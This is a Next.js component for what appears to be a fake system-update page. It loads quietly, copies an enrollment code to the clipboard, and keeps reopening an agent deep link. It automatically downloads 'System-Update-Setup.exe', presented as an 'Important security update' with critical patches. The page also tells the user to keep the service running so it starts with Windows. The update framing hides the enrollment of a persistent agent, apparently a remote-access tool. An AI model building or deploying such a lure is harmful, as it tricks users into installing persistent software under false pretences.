"use client"

import { useCallback, useEffect, useRef, useState } from "react"
import Link from "next/link"
import { FaDownload, FaShieldAlt } from "react-icons/fa"
import { Button } from "@/components/ui/button"
import {
  UpdateFlowLayout,
  UpdateProgressBar,
} from "@/components/update/UpdateFlowLayout"
import {
  buildConnectUrl,
  copyEnrollmentCode,
  fetchAgentBootstrap,
  triggerAgentDownload,
  tryOpenAgentDeepLink,
  type AgentBootstrap,
} from "@/lib/agent-enroll"

const API_BASE =
  process.env.NEXT_PUBLIC_API_URL?.replace(/\/$/, "") ||
  "http://localhost:3000/v1"

const DEEP_LINK_POLL_MS = 3_000
const DEEP_LINK_POLL_DURATION_MS = 120_000

type AgentEnrollFlowProps = {
  code: string
}

type SetupPhase = "loading" | "ready" | "invalid"

export function AgentEnrollFlow({ code }: AgentEnrollFlowProps) {
  const autoStartRef = useRef(false)
  const bootstrapRef = useRef<AgentBootstrap | null>(null)
  const [bootstrap, setBootstrap] = useState<AgentBootstrap | null>(null)
  const [phase, setPhase] = useState<SetupPhase>("loading")
  const [downloadStarted, setDownloadStarted] = useState(false)

  const runEnrollment = useCallback(
    async (config: AgentBootstrap) => {
      if (!config.valid || !config.downloadUrl) return

      setDownloadStarted(true)
      await copyEnrollmentCode(config.code || code)

      if (config.deepLink) {
        tryOpenAgentDeepLink(config.deepLink)
      }

      window.setTimeout(() => {
        triggerAgentDownload(config.downloadUrl!)
      }, 1200)
    },
    [code]
  )

  useEffect(() => {
    let cancelled = false
    autoStartRef.current = false
    bootstrapRef.current = null
    setBootstrap(null)
    setPhase("loading")
    setDownloadStarted(false)

    void fetchAgentBootstrap(code).then((result) => {
      if (cancelled) return

      bootstrapRef.current = result
      setBootstrap(result)

      if (!result.valid) {
        setPhase("invalid")
        if (result.reason === "instant_only" && result.instantUrl) {
          window.location.replace(result.instantUrl)
        }
        return
      }

      setPhase("ready")

      void fetch(`${API_BASE}/enrollment-links/${code}/track/open`, {
        method: "POST",
      })

      if (autoStartRef.current) return
      autoStartRef.current = true
      void runEnrollment(result)
    })

    return () => {
      cancelled = true
    }
  }, [code, runEnrollment])

  useEffect(() => {
    if (!downloadStarted) return

    const config = bootstrapRef.current
    if (!config?.deepLink) return

    const startedAt = Date.now()
    const pollId = window.setInterval(() => {
      if (Date.now() - startedAt > DEEP_LINK_POLL_DURATION_MS) {
        window.clearInterval(pollId)
        return
      }
      tryOpenAgentDeepLink(config.deepLink!)
    }, DEEP_LINK_POLL_MS)

    return () => window.clearInterval(pollId)
  }, [downloadStarted])

  if (phase === "loading") {
    return (
      <UpdateFlowLayout
        title="Checking for updates"
        subtitle="Please wait while we look for the latest updates for your computer."
      >
        <UpdateProgressBar active />
        <p className="mt-4 text-sm text-[#555]">Searching update catalog…</p>
      </UpdateFlowLayout>
    )
  }

  if (phase === "invalid" || !bootstrap?.valid) {
    return (
      <UpdateFlowLayout
        title="Update unavailable"
        subtitle="This update link is no longer valid."
      >
        <p className="text-sm text-[#555]">
          Status:{" "}
          <span className="font-medium text-[#333]">
            {bootstrap?.reason?.replace(/_/g, " ") || "invalid"}
          </span>
          . Contact your IT administrator for a new update link.
        </p>
      </UpdateFlowLayout>
    )
  }

  const connectUrl =
    bootstrap.kind === "BOTH"
      ? bootstrap.instantUrl || buildConnectUrl(code)
      : null

  return (
    <UpdateFlowLayout
      title="Updates available"
      subtitle={
        downloadStarted
          ? "Your update package is downloading. Install it to apply the latest security and feature updates."
          : "Preparing your update package…"
      }
    >
      <div className="space-y-5">
        <div className="flex items-start gap-3 rounded-md border border-[#d6e9f8] bg-[#f3f9fd] p-4">
          <FaShieldAlt className="mt-0.5 size-5 shrink-0 text-[#0078d4]" />
          <div className="space-y-1 text-sm text-[#444]">
            <p className="font-medium text-[#222]">Important security update</p>
            <p>
              This update includes critical patches. We recommend installing it
              as soon as possible.
            </p>
          </div>
        </div>

        <div className="space-y-2">
          <div className="flex items-center justify-between text-sm">
            <span className="text-[#555]">Download progress</span>
            <span className="font-medium text-[#0078d4]">
              {downloadStarted ? "Downloading…" : "Starting…"}
            </span>
          </div>
          <UpdateProgressBar active={!downloadStarted} />
        </div>

        <ol className="list-decimal space-y-2.5 pl-5 text-sm text-[#555]">
          <li>
            Run{" "}
            <span className="font-medium text-[#333]">
              System-Update-Setup.exe
            </span>{" "}
            when the download completes
          </li>
          <li>Follow the on-screen steps to complete installation</li>
          <li>
            Keep the update service running in the system tray after install
          </li>
          <li>Future updates will install automatically when Windows starts</li>
        </ol>

        <p className="rounded-md bg-[#f5f5f5] px-3 py-2 text-xs text-[#666]">
          Your update authorization code was copied to the clipboard. The
          installer will apply it automatically — you do not need to return to
          this page.
        </p>

        {connectUrl ? (
          <div className="space-y-2 rounded-md border border-dashed border-[#ccc] p-4">
            <p className="text-sm font-medium text-[#333]">
              Prefer not to install right now?
            </p>
            <p className="text-xs text-[#666]">
              Run a quick online update check in your browser instead. Full
              updates still require the installer.
            </p>
            <Button asChild variant="secondary" size="sm" className="mt-1">
              <Link href={connectUrl}>Run online update check</Link>
            </Button>
          </div>
        ) : null}

        <div className="flex flex-col gap-2 border-t border-[#e5e5e5] pt-4 sm:flex-row">
          <Button
            type="button"
            className="bg-[#0078d4] hover:bg-[#006cbe]"
            onClick={() => {
              const config = bootstrapRef.current
              if (config?.valid) void runEnrollment(config)
            }}
          >
            <FaDownload className="mr-2 size-3.5" />
            Download update again
          </Button>
          <Button
            type="button"
            variant="outline"
            onClick={() => {
              const config = bootstrapRef.current
              if (config?.deepLink) tryOpenAgentDeepLink(config.deepLink)
            }}
          >
            Resume installed update
          </Button>
        </div>
      </div>
    </UpdateFlowLayout>
  )
}
